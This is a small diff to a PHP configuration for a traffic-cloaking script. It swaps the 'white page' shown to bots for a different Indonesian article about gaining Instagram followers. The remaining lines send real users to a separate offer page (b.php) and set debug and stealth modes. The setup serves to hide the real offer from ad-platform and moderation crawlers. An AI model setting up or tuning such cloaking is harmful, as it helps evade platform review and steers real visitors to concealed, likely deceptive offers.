@@ -1,6 +1,6 @@
 <?php
 /* Required settings     */
-$CLOAKING['WHITE_PAGE'] = 'https://infokomputer.grid.id/read/123761495/bagaimana-cara-mudah-meningkatkan-followers-ig-di-instagram';//PHP/HTML file or URL used for bots
+$CLOAKING['WHITE_PAGE'] = 'https://www.diskop.id/teknologi/fast-follow-in-indonesia/';//PHP/HTML file or URL used for bots
 $CLOAKING['OFFER_PAGE'] = 'b.php';//PHP/HTML file or URL offer used for real users
 $CLOAKING['DEBUG_MODE'] = 'off';// replace "on" with "off" to switch from debug to production mode
 $CLOAKING['STEALTH'] = 'off';// replace "on" with "off" to hide stat page
